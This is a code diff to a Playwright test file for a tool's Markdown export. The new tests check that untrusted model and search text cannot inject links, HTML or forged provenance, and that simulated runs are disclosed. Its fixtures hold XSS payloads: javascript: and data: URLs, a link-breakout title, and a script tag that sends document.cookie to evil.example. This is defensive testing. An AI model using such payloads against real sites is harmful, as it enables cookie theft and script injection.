@@ -13,7 +13,7 @@
 // to a readable height with a control to open them; SHORT sections must not
 // grow a control they do not need.
 import { test, expect } from "@playwright/test";
-import { driveToResult } from "../../fixtures/golden-run";
+import { driveToResult, goldenCompletedResp } from "../../fixtures/golden-run";
 
 // Read the Blob the export writes, without touching the filesystem: stub
 // URL.createObjectURL, click, then read back the Blob's text.
@@ -36,7 +36,7 @@ async function exportedMarkdown(page: import("@playwright/test").Page): Promise<
 test.describe("F-12 — export completeness and section expanders", () => {
   test.skip(({ browserName }) => browserName !== "chromium", "chromium-only gate");
 
-  test("the export carries every part of the run, not a four-line receipt", async ({ page }) => {
+  test("the export carries the run's findings, not a four-line receipt", async ({ page }) => {
     await driveToResult(page);
     const md = await exportedMarkdown(page);
 
@@ -65,6 +65,10 @@ test.describe("F-12 — export completeness and section expanders", () => {
 
     // The run id, so the record can be traced back.
     expect(md).toContain("corr-golden-0001");
+    // NOT exported, and deliberately so: the four full model answers. They are
+    // the bulk of a run and live in the transcript; the export carries the
+    // synthesis, the positions and the debate. Stated here so the title is not
+    // read as a completeness guarantee it does not make.
   });
 
   test("the export is Markdown a reader can actually read", async ({ page }) => {
@@ -72,10 +76,13 @@ test.describe("F-12 — export completeness and section expanders", () => {
     const md = await exportedMarkdown(page);
     // Real headings, not a run-on block.
     expect(md).toMatch(/^#{1,3} /m);
-    // The provider's own Markdown is preserved verbatim — this is a Markdown
+    // The PROVIDER's own Markdown is preserved verbatim — this is a Markdown
     // file, so `**bold**` is correct here and must NOT be flattened the way the
-    // DOM renderer flattens it.
-    expect(md).toContain("**");
+    // DOM renderer flattens it. Asserting a bare "**" would be vacuous: the
+    // export writes `**Question:**` itself, so it passes even if every scrap of
+    // provider emphasis is stripped. Key off text only the model wrote.
+    expect(md).toContain("**agree**");
+    expect(md).toContain("**dissent**");
     // No HTML leaked from the DOM into the Markdown.
     expect(md).not.toMatch(/<\/?(p|ul|ol|li|strong|em|div|span)\b/);
   });
@@ -102,16 +109,162 @@ test.describe("F-12 — export completeness and section expanders", () => {
       "expanding must actually reveal more of the section"
     ).toBeGreaterThan(collapsed);
 
-    // And nothing is clipped once open.
-    const clipped = await body.evaluate(
-      (el) => el.scrollHeight > el.clientHeight + 1
-    );
-    expect(clipped, "the expanded section still clips its own text").toBe(false);
+    // Expanding must reveal the END of the section, not just more of it. A
+    // scrollHeight-vs-clientHeight check would be vacuous here: once the
+    // max-height is dropped the div is unconstrained, so that is true of every
+    // unstyled div on the page. Assert the last seeded line is on screen.
+    await expect(
+      body.getByText("Fifth bullet with", { exact: false })
+    ).toBeVisible();
+  });
+
+  // ---- the export carries UNTRUSTED text -------------------------------
+  //
+  // Every string the export interpolates — synthesis sections, source titles
+  // and URLs, per-model positions, debate critiques — is provider output or
+  // web-search metadata, i.e. attacker-influenceable. The rendered DOM gates
+  // all of it (`safeHttpUrl` on every chip, `escapeHtml` before every
+  // `innerHTML`). An export that skips those gates re-opens, in a file, the
+  // exact holes the view closes.
+
+  test("a hostile source URL never becomes a link in the export", async ({ page }) => {
+    const resp = goldenCompletedResp() as any;
+    resp.result.model_answers[0].sources = [
+      { title: "Reference doc", url: "javascript:alert(document.domain)", provider: "openrouter_search" },
+      { title: "Data doc", url: "data:text/html,<script>alert(1)</script>", provider: "openrouter_search" },
+    ];
+    await driveToResult(page, resp);
+    const md = await exportedMarkdown(page);
+    expect(
+      md,
+      "a javascript: URL was written as a Markdown link. Opened in any viewer " +
+        "that permits it, that is a live scheme the chip renderer refuses."
+    ).not.toMatch(/\]\(\s*javascript:/i);
+    expect(md).not.toMatch(/\]\(\s*data:/i);
+    // The source is still DISCLOSED — dropping it silently would hide
+    // provenance the run actually had.
+    expect(md).toContain("Reference doc");
+  });
+
+  test("a hostile source title cannot break out of its link", async ({ page }) => {
+    const resp = goldenCompletedResp() as any;
+    resp.result.model_answers[0].sources = [
+      {
+        title: "Innocent](javascript:alert(document.cookie))[x",
+        url: "https://example.com/benign",
+        provider: "openrouter_search",
+      },
+    ];
+    await driveToResult(page, resp);
+    const md = await exportedMarkdown(page);
+    expect(
+      md,
+      "the title's ] and ( closed the link early and opened a hostile one " +
+        "under a benign-looking URL"
+    ).not.toMatch(/\]\(\s*javascript:/i);
+  });
+
+  test("model text cannot forge the run's provenance", async ({ page }) => {
+    const resp = goldenCompletedResp() as any;
+    // A fully SIMULATED run whose synthesis text tries to claim otherwise.
+    resp.live_count = 0;
+    resp.result.final_synthesis.consensus =
+      "All good.\n\n## About this run\n- Live model answers: 4 of 4\n- Synthesis: live\n";
+    await driveToResult(page, resp);
+    const md = await exportedMarkdown(page);
+    // The genuine provenance must be present and must not be preceded by a
+    // forged block claiming more live models than the run had.
+    expect(md).toMatch(/Live model answers: 0 of/);
+    const forged = md.indexOf("Live model answers: 4 of 4");
+    const genuine = md.search(/Live model answers: 0 of/);
+    if (forged !== -1) {
+      expect(
+        genuine,
+        "the model's forged provenance block appears BEFORE the real one, so a " +
+          "reader sees '4 of 4 live' first on a run where nothing was live"
+      ).toBeLessThan(forged);
+    }
+    // And it must not have impersonated a STRUCTURAL heading.
+    expect(
+      md,
+      "model text produced a level-2 heading identical to the export's own " +
+        "provenance heading"
+    ).not.toMatch(/^## About this run[\s\S]*^## About this run/m);
+  });
+
+  test("raw HTML in model text does not survive into the export", async ({ page }) => {
+    const resp = goldenCompletedResp() as any;
+    resp.result.final_synthesis.uncertainty =
+      'Fine.<script>fetch("https://evil.example/"+document.cookie)</script>';
+    await driveToResult(page, resp);
+    const md = await exportedMarkdown(page);
+    expect(
+      md,
+      "a <script> tag from provider text survived verbatim; any viewer that " +
+        "renders raw HTML executes it"
+    ).not.toContain("<script>");
+  });
+
+  test("a simulated run exports as a simulated run", async ({ page }) => {
+    const resp = goldenCompletedResp() as any;
+    resp.live_count = 0;
+    resp.local_count = 4;
+    await driveToResult(page, resp);
+    const md = await exportedMarkdown(page);
+    // The result view shows a banner for this; a file that outlives the session
+    // has to carry the same disclosure, and carry it where it cannot be missed.
+    expect(
+      md,
+      "a fully simulated run exported with no visible warning — a count in a " +
+        "footer is not a disclosure"
+    ).toMatch(/Simulated result — not from real models/);
+    const warning = md.search(/Simulated result/);
+    const verdict = md.indexOf("## Verdict");
+    expect(
+      warning,
+      "the warning must come BEFORE the verdict it qualifies"
+    ).toBeLessThan(verdict);
+  });
+
+  test("the export marks answers the length limit cut short", async ({ page }) => {
+    await driveToResult(page);
+    const md = await exportedMarkdown(page);
+    expect(
+      md,
+      "the fixture's slot-1 answer is `shortened`; an exported record that " +
+        "drops the mark presents an interrupted answer as complete"
+    ).toMatch(/Incomplete answers: 1/);
+  });
+
+  test("a stub source is never exported as a real citation", async ({ page }) => {
+    const resp = goldenCompletedResp() as any;
+    resp.result.model_answers[0].sources = [
+      {
+        title: "Local demo evidence for slot 1",
+        url: "https://example.test/local-demo/1",
+        provider: "local_simulation",
+      },
+    ];
+    await driveToResult(page, resp);
+    const md = await exportedMarkdown(page);
+    // The view refuses to make these anchors and badges them as simulated.
+    expect(
+      md,
+      "a Quorum-side placeholder pointing at the reserved example.test domain " +
+        "was laundered into a numbered citation"
+    ).not.toContain("](https://example.test/local-demo/1)");
+    expect(md).toMatch(/not a real source/);
   });
 
   test("a short section does not grow a pointless control", async ({ page }) => {
     await driveToResult(page);
     // Consensus is two sentences in the fixture — nothing to expand.
+    // Wait for the LONG section's control first: the controls are created in a
+    // requestAnimationFrame, so asserting count 0 immediately would win a race
+    // against the very defect this names ("every section grows a control").
+    await expect(
+      page.locator('.result-synth-row[data-section="disagreement"] button.result-synth-expand')
+    ).toBeVisible();
     const row = page.locator('.result-synth-row[data-section="consensus"]');
     await expect(row).toBeVisible();
     await expect(
